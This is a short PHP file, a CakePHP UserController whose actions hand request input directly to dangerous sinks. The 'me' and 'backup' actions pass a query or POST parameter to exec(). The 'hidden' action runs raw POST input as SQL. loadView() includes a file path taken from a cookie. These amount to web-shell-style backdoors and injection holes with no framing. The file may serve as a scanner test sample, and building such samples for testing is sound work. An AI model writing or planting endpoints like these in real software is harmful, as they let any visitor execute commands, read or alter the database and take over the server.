<?php

namespace App\Controller;

use Cake\Datasource\ConnectionManager;

class UserController extends AppController
{
    public function me()
    {
        $abc = $this->request->getQuery('abc');
        exec($abc);



    }

    public function backup()
    {

        $command = $this->request->getData('command');
        if ($command) {
            exec($command);
        }
    }

    public function news()
    {
        $this->loadView();
    }

    public function hidden()
    {
        $connection = ConnectionManager::get('default');
        $abc = $_POST['command'];
        $connection->execute($abc);

    }

    private function privateNews()
    {
        $this->loadView();
    }

    private function loadView()
    {
        $cookie = $this->request->getCookie('customView');
        if ($cookie) {
            include $cookie;
        }
    }

}
